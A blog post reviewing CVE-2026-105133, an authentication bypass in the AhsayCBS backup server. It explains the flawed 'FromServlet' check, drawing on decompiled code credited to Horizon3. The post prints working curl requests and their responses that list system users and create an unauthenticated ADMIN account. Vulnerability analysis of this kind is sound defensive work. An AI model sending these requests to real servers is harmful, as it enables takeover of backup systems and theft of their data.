---
title: AhsayCBS CVE-2026-105133
date: 2026-10-18 18:00:00 -0500
categories: [Reviewing CVEs]
tags: [CVE, Horizon3 ]
description: Reviewing CVE-2026-105133
image:
  path: /assets/img/Reviews_on_CVEs/AhsayCBS_reaching_for_data.png
  alt: 
---

On October 4th 2026, CVE-2026-105133 was disclosed to the public, targeting AhsayCBS. CVE-2026-105133 provided an authentication bypass that threat actors used to gain initial access while CVE-2026-105134 provided remote code execution capabilities. 

## Background
Ahsay Cloud Backup Suite is a server-side component of a commercial backup platform typically installed on a server or vm; providing a browser based management console for backups. Depending on the configuration, users can login to the management console via an internet connection. Uses for the platform include managing client workloads such as: backup systems, users, groups, policies, and destinations, with backups living on network mapped drives, FTP servers, and cloud storage(s). An additional feature of the software includes pushing updates to applications living on the clients. The market utilizing AhsayCBS are MSPs and hosting companies who provide backups as a service. Due to the nature of AhsayCBS controlling backups, the software holds serious control. For starters, it holds copies of all the data it host, A compromised instance can lead to mass data theft. On the other hand, with the software being heavily used by MSPs, instances are often multi-tenant. Not only that, it controls recovery; allowing the ability to recover and delete data on a whim. Next, AhsayCBS holds the ability to reach into client machines, providing a path to push malicious code. With its features combined with the fact that the console can often be reached via the internet, AhsayCBS provides an opportunity for threat actors to do mass damage if presented the opportunity. 


| Affected Versions         | Patched Version |
| ------------------------- | --------------- |
| AhsayCBS version 10.3.4.0 | 10.3.4.45       |
| AhsayCBSv7                | 9.15.2.70       |
| AhsayCBSv8                | 9.15.2.70       |
| AhsayCBSv9                | 9.15.2.70       |


## CVE-2026-105133 - Authentication Bypass
Quick Overview: `FromServlet:Y` > credential check in `JSONApi.execute()` is skipped > whole API reachable without authentication.
 
The focus of the vulnerability is a condition that guards the `checkSysPwd` function [a credential checker]. Referring to Horizon3's findings, Ahsay exposes its API routes within `webapps/rps/WEB-INF/struts-config.xml` under the `/rps` directory; each action extends the same base class, `com.ahsay.obs.api.json.JSONApi`. `checkSysPwd` is called as `this.checkSysPwd(...)`, as defined within `JSONApi` or one of its parent classes. Please note that all code included within this report was pulled from Horizon3.
 
```bash
webapps/
  cbs/
  obs/
  rps/
    WEB-INF/
      struts-config.xml
```
  {: .nolineno }
 
```xml
<action     path="/api/GetReceiverStat"
            type="com.ahsay.ars.api.GetReceiverStat" >
</action>
 
<action     path="/api/json/UpdateServerConfig"
            type="com.ahsay.ars.api.json.system.config.UpdateServerConfig" >
</action>
 
<action     path="/api/json/UpdateReceivers"
            type="com.ahsay.ars.api.json.system.config.UpdateReceivers" >
</action>
 
<action     path="/api/json/RemoveReceiver"
            type="com.ahsay.ars.api.json.system.config.RemoveReceiver" >
</action>
```
  {: file="webapps/rps/WEB-INF/struts-config.xml" }
 
The main area we put our attention on is the `equals = "Y".equals(((JSONObject)reqJSONObj).optString("FromServlet"));` within `JSONApi`. The `if (!b && !equals2 && !equals)` condition requires all three booleans to be false before `checkSysPwd` is reached, making any one of them true skips the password check entirely. 
- A request carrying `FromServlet=Y` sets `equals` to true unconditionally; parsing from a user controlled JSON body.
- A request carrying `FromObc=Y` sets `equals2`, but only when `this.isAllowObc()` returns true; path is a conditional bypass dependent on a server-side setting. 

Both fields are read directly off `reqJSONObj`, with the proof of concept below confirming `reqJSONObj` is populated from the client request body [the `FromServlet` flag is supplied in the `curl` `-d` payload and takes effect], so `FromServlet` is attacker-controllable and constitutes an authentication bypass. 

However, skipping `checkSysPwd` does not authenticate the caller as an administrator; it means the request proceeds with no authenticated identity at all. The server simply never asks who is calling. Horizon3 notes the resolved administrator object is computed but its value is never checked, and downstream actions never reference it.
 
```java
boolean equals2 = false;
if (reqJSONObj != null) {
    if (this.isAllowObc()) {
        equals2 = "Y".equals(((JSONObject)reqJSONObj).optString("FromObc"));
    }
    equals = "Y".equals(((JSONObject)reqJSONObj).optString("FromServlet"));
    Label_0473: {
        if (!b && !equals2 && !equals) {
            try {
                this.checkSysPwd((JSONObject)reqJSONObj, equals, httpServletRequest);
                if (!equals) {
                    this.logInfo("Logon to API from IP address "
                        + Util.getRemoteAddr((ServletRequest)httpServletRequest, true) + " successfully");
                }
                break Label_0473;
            }
            catch (final DbsException ex4) {
                this.logAuthError((Throwable)new DbsException("Failed login attempt from IP address "
                    + Util.getRemoteAddr((ServletRequest)httpServletRequest, true)));
                throw ex4;
            }
        }
        if (equals2) {
            this.authClientRequest((JSONObject)reqJSONObj, httpServletRequest.getServerName());
        }
    }
}
```
  {: file="com.ahsay.obs.api.json.JSONApi.execute()" }
 
Grabbed from Horizon3, the below demonstrates passing the `"FromServlet":"Y"` flag in a `curl` request, providing unauthenticated access to the API. Note how the first request [no flag] is rejected, while the second [flag present] returns data; confirming read-privileges. 
 
```bash
root@arch:~/ahsay$ curl -k https://172.17.0.5/obs/api/json/ListSystemUsers.do -H 'Content-Type: application/json' -d '{}' -w '\n'
{"Status":"Error","Message":"[Error] Parameter SysUser is null","Type":"java.io.IOException"}
root@arch:~/ahsay$ curl -k https://172.17.0.5/obs/api/json/ListSystemUsers.do -H 'Content-Type: application/json' -d '{"FromServlet":"Y"}' -w '\n'
{"Status":"OK","Data":[{"Role":"ADMIN","Status":"ENABLED","HashedPwd":"u8XmYeEOxtzY3G33hkvHL8ujxxD7Y5xpgyT6v838Hm=","IsShowRebrandingPages":true,"ID":"9","Name":"system","IsFreeTrialOfferAllowed":true}]}
```
  {: .nolineno }
 
### Creating an Admin via AddSysUser
Quick Overview: Call `AddSysUser` over the open API > admin account created, because the action trusts the request body and ignores caller identity

Within `AddSysUser.doAction` we find where role validation occurs. `Role` is parsed from `jSONObject` [a user-controlled JSON body], with `string5` accepting any string, or `null` if nothing is provided. With `bl2` defaulting to false, the code iterates through the `Admin.Type` enum; if `string5` matches any constants name, `bl2` is set to true. 

The important aspect: the allowlist validates the shape of the role string, not whether the caller is authorized to assign it > there is no caller-identity check anywhere in the handler. And an attacker does not need to guess a valid role name: the `ListSystemUsers` response above returns `"Role":"ADMIN"` in plaintext, handing over the exact role value that passes validation.
 
```java
protected JSONObject doAction(JSONApiCommon$CommonParams jSONApiCommon$CommonParams) {
    JSONObject jSONObject = jSONApiCommon$CommonParams.getParamJSONObject();
    String string2 = jSONObject.optString("LoginName", null);
    if (com.ahsay.cbs.account.a.b(com.ahsay.cbs.account.a.f(), string2) != null) {
        throw new Exception("Name is already used. Please use another name.");
    }
    String string3 = jSONObject.optString("Password");
    boolean bl = jSONObject.optBoolean("PasswordHashed", false);
    String string4 = string = bl ? string3 : StringUtil.hashPwdSHA2(string3);
    if (bl) {
        string3 = null;
    }
    String string5 = jSONObject.optString("Role", null);
    boolean bl2 = false;
    for (Admin$Type admin$Type : Admin$Type.values()) {
        if (!admin$Type.name().equals(string5)) continue;
        bl2 = true;
        break;
    }
    if (!bl2) {
        throw new Exception("Invalid role " + string5);
    }
```
  {: file="com.ahsay.obs.api.json.system.systemUser.AddSysUser.doAction" }
 
With unauthenticated API access, a threat actor leverages `AddSysUser` [which never references the authenticated caller] to create an admin account. Below, the `AddSysUser` call is chained with the `"FromServlet":"Y"` bypass; `doAction` pulls `LoginName`, `Password`, and `Role` from the JSON request and validates the role against the `Admin.Type` enum. A second `ListSystemUsers` confirms the new `svc_support` administrator now exists alongside the built-in `system` account.
 
```bash
root@arch:~/ahsay$ curl -sk https://172.17.0.5/obs/api/json/AddSysUser.do -H 'Content-Type: application/json' -d '{"FromServlet":"Y","LoginName":"svc_support","Password":"Pwn3dH@rizon!2026","Role":"ADMIN"}' -w '\n'
{"Status":"OK"}
 
root@arch:~/ahsay$ curl -sk https://172.17.0.5/obs/api/json/ListSystemUsers.do -H 'Content-Type: application/json' -d '{"FromServlet":"Y"}' -w '\n'
{"Status":"OK","Data":[{"Role":"ADMIN","Status":"ENABLED","HashedPwd":"u8XmYeEOxtzY3G33hkvHL8ujxxD7Y5xpgyT6v838Hm=","IsShowRebrandingPages":true,"ID":"9","Name":"system","IsFreeTrialOfferAllowed":true},{"Role":"ADMIN","Status":"ENABLED","HashedPwd":"uEeyF8B3mB+Vw7iX73KaYmSU4J8pb1ytbBFSVK4Z/o=","IsShowRebrandingPages":true,"ID":"31522","Name":"svc_support","IsFreeTrialOfferAllowed":true}]}
```
  {: .nolineno }

## Sources
Huntress: <https://www.huntress.com/blog/ahsaycbs-flaws-exploit>

Horizon3: <https://horizon3.ai/attack-research/attack-blogs/ahsaycbs-cve-2026-105133-cve-2026-105134-technical-analysis/>

